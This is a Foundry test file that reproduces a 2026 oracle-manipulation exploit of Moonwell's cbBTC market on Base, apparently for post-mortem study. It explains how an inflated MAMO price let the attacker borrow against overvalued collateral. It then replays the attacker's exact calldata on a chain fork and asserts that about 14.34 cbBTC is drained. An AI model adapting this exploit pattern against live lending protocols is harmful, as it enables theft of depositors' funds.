// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Moonwell (Compound-v2 fork) — Base
// ~71.36 cbBTC (~$5.7M) drained from the mcbBTC market across 12 borrow txs by one attacker EOA.
//
// Primary (largest) tx : 0xafb6f0fa257b115a5c813bf787b4c1535e63888b1d0dbeb1f3788f557f51798f
//                        block 50516532, borrows 14.3380 cbBTC (~$1.15M)
// Attacker EOA / ctrt  : 0x719eae70d4A83f35bF82A2740699F5db84BE919D
//                        An EIP-7702-delegated EOA: its code is the designator 0xef0100 +
//                        implementation 0xabda3cfe3ce2668b7829aaccbe594abb326bce4f at the fork
//                        block. from == to == the attacker: the EOA calls its own delegated
//                        implementation, which internally calls mcbBTC.borrow(...).
//
// Victim market        : mcbBTC 0xF877ACaFA28c19b96727966690b2f44d35aD5976 (underlying cbBTC
//                        0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf)
// Comptroller          : 0xfBb21d0380beE3312B33c4353c8936a0F13EF26C
// Oracle               : 0xEC942bE8A8114bFD0396A5052c36027f2cA6a9d0
// Collateral market    : mMAMO 0x2F90Bb22eB3979f5FfAd31EA6C3F0792ca66dA32
//                        (underlying MAMO 0x7300B37DfdfAb110d83290A29DfB31B1740219fE, 18 dec)
//
// Root cause (verified against the on-chain trace and state, NOT a key/signer/privileged path):
//   Moonwell prices MAMO via a ChainlinkOEVWrapper (0xDBD37C274A70A8A3f92A227c843a6a8d3203afe6,
//   "MAMO / USD") that forwards a Chainlink OCR2 aggregator
//   (0x6F49F44436A220C8aebd5776AB58b80Ecb41622E, AccessControlledOCR2Aggregator). MAMO is a
//   thinly-traded token; the attacker moved MAMO's real market price, the OCR2 feed reported the
//   elevated quote, and the wrapper forwarded it unchanged. Measured on-chain:
//     - MAMO/USD at a clean block 50000000 : 881_200   (8 dec) = $0.008812
//     - MAMO/USD at the exploit block      : 8_807_216 (8 dec) = $0.088072   (~10x)
//   getUnderlyingPrice(mMAMO) moves in lock-step: 8.812e15 clean -> 8.807e16 at exploit.
//   The attacker held 41,517,106 MAMO supplied as mMAMO collateral. At the inflated price that
//   collateral was worth ~$3.65M instead of ~$365k, giving ~$1.2M of borrow capacity
//   (getAccountLiquidity at the fork block = 1.205e24, i.e. ~$1.2M, shortfall 0). Against that the
//   attacker repeatedly called the permissionless Compound borrow() on mcbBTC and walked out with
//   real cbBTC, leaving bad debt behind once the price normalised.
//
//   borrow() is a public, permissionless function; there is no admin, signer, or owner path in
//   any leg. The only "authorization" is the manipulated oracle price the comptroller trusts.
//
// Not self-contained in a single tx: the price manipulation and the mMAMO collateral supply
// happened in earlier transactions, so at the fork block (exploit block - 1) the inflated MAMO
// price and the collateral are already present in state. Each of the 12 borrow txs is the same
// permissionless borrow against that standing inflated collateral, which is what makes the bug
// systemic/repeatable rather than a one-off. All 12 are to == the attacker, selector 0x7997f387,
// borrowing cbBTC from mcbBTC:
//   0xafb6f0fa...f51798f 14.3380   0x6087b2d9...a755f93f 12.5266   0x6bac80e2...2883a495 12.4480
//   0x7a75fe55...d3647323 11.5528  0xb7891b3f...1266b08b  6.3108   0x9772ee56...453a36314  4.4661
//   0x739108389...9f2d341  2.4206  0x9282f7ac...9cb776e63 2.1873   0x921b1389...e868c704e  1.9200
//   0xb1fc4190...291e4c53  1.7228  0xbf64f94b...c544616d  0.9613   0x09687d74...4a395593e  0.5007
//
// Faithful reproduction: fork at block-1 (real protocol state, inflated price and collateral
// already present) and replay the primary tx's EXACT calldata against the attacker's 7702
// contract, pranking the attacker EOA as BOTH msg.sender and tx.origin. The 100-byte calldata
// (selector 0x7997f387, market 0xf877..., amount 0x55763e60 = 1_433_796_192) is hardcoded verbatim
// from the on-chain tx input below. Because the fork is one block early, the attacker impl (which
// sizes the borrow from live liquidity, not straight from the arg) borrows 1_433_812_576 vs the
// on-chain 1_433_796_192 — a 16,384 sat (0.00016 cbBTC, ~$13) difference from cross-block interest
// accrual. Both round to 14.34 cbBTC.
//
// MAMO's token bytecode uses a Cancun opcode (Base is a post-Cancun chain), so cancun is
// required, same as the Atomic PoC in this folder:
//   forge test --contracts ./src/test/2026-08/MoonwellMAMO_exp.sol --evm-version cancun -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IChainlinkFeed {
    // MAMO/USD ChainlinkOEVWrapper -> forwards the OCR2 aggregator, 8 decimals
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}

contract MoonwellMAMO_exp is Test {
    address internal constant ATTACKER = 0x719eae70d4A83f35bF82A2740699F5db84BE919D;
    IERC20 internal constant cbBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    address internal constant mcbBTC = 0xF877ACaFA28c19b96727966690b2f44d35aD5976;
    // Moonwell prices MAMO through this ChainlinkOEVWrapper ("MAMO / USD", 8 dec), which forwards
    // the OCR2 aggregator 0x6F49F44436A220C8aebd5776AB58b80Ecb41622E unchanged.
    IChainlinkFeed internal constant MAMO_USD_FEED =
        IChainlinkFeed(0xDBD37C274A70A8A3f92A227c843a6a8d3203afe6);

    uint256 internal constant EXPLOIT_BLOCK = 50516532;
    // MAMO/USD (8 dec) at a clean block (50000000), before the market price was pushed up.
    int256 internal constant CLEAN_MAMO_USD = 881_200; // $0.008812

    // exact input of the primary tx: borrowCbBTC via the attacker's 7702 impl (selector 0x7997f387)
    bytes internal constant EXPLOIT_CALLDATA =
        hex"7997f38700000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000f877acafa28c19b96727966690b2f44d35ad59760000000000000000000000000000000000000000000000000000000055763e60";

    function setUp() public {
        vm.createSelectFork("base", EXPLOIT_BLOCK - 1);
    }

    function testExploit() public {
        // 1) The manipulation is already baked into state: the MAMO/USD feed the Moonwell oracle
        //    reads is ~10x its clean value. Read the wrapper feed directly.
        (, int256 mamoUsd,,,) = MAMO_USD_FEED.latestRoundData();
        emit log_named_decimal_int("MAMO/USD (clean baseline, 8dec)", CLEAN_MAMO_USD, 8);
        emit log_named_decimal_int("MAMO/USD (at exploit,     8dec)", mamoUsd, 8);
        assertGt(mamoUsd, CLEAN_MAMO_USD * 8, "MAMO price is not inflated");
        // At this inflated price the attacker's 41,517,106 MAMO of mMAMO collateral is worth ~$3.65M
        // (vs ~$365k true), giving ~$1.2M of borrow capacity (getAccountLiquidity = 1.205e24 at the
        // fork block, shortfall 0) against which the borrow below draws real cbBTC.

        // 2) Replay the primary tx: attacker EOA calls its own 7702 impl, which borrows cbBTC.
        uint256 pre = cbBTC.balanceOf(ATTACKER);
        vm.prank(ATTACKER, ATTACKER); // msg.sender AND tx.origin == attacker, matching the trace
        (bool ok,) = ATTACKER.call(EXPLOIT_CALLDATA);
        assertTrue(ok, "exploit borrow reverted");
        uint256 gained = cbBTC.balanceOf(ATTACKER) - pre;

        emit log_named_decimal_uint("cbBTC drained from mcbBTC market", gained, 8);

        // 3) Net attacker gain ~= 14.34 cbBTC for this single tx.
        assertApproxEqAbs(gained, 1433796192, 1e5, "drained amount diverges from ~14.34 cbBTC");
        assertGt(gained, 14.3e8, "less than 14.3 cbBTC drained");
    }
}
